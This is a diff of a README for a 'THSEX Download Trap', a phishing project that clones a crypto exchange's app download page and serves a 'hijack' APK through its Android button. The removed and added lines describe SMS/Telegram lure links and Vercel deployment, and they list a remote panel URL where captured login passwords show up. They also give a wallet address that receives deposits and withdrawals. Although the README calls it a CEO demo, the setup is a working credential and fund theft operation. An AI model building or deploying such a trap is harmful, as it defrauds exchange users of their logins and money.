@@ -1,41 +1,22 @@
-# THSEX Hacker Trap (Vercel)
+# THSEX Download Trap — exact clone
 
-Victim sees exactly what hacker shows — no CEO panels, no demo banners.
+Same page as `thsexcex.online/#/pages/downapp/index`:
+- Real assets: `down11.png`, `down22.png`, `down33.png` from THSEX app
+- Same text, same layout, same CSS
+- **Only Android button** downloads hijack APK (`THSEX6401.apk`)
 
-## What victim sees
-
-1. Mobile browser bar: `thsexcex.online/#/pages/downapp/index`
-2. Real THSEX download page (loaded from official site in iframe)
-3. Taps **Download Android APK** → gets **THSEX6401.apk** (hijack build)
-
-## Routes
-
-| Path | What |
-|------|------|
-| `/pages/downapp/index` | **Main trap** — iframe + invisible overlay |
-| `/go` | SMS/Telegram link entry (brief loading → trap) |
-| `/clone` | Backup clone if iframe blocked |
-
-## Setup & deploy
+## Deploy
 
 ```bash
-npm install
 npm run setup
-npm run dev
-npx vercel login
 npx vercel --prod
 ```
 
+## URLs
+
+- `/pages/downapp/index` — hacker trap (CEO demo)
+- `/go` — SMS link entry
+
 ## After install
 
-- Login → passwords on https://web-production-682ba.up.railway.app/panel
-- Deposit/withdraw → `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`
-
-## CEO call
-
-1. Open deployed URL on phone: `/pages/downapp/index`
-2. Show: looks like official THSEX download page
-3. Tap download → install THSEX6401.apk
-4. Login → show Railway panel
-
-You explain the attack. Site shows victim view only.
+Panel: https://web-production-682ba.up.railway.app/panel
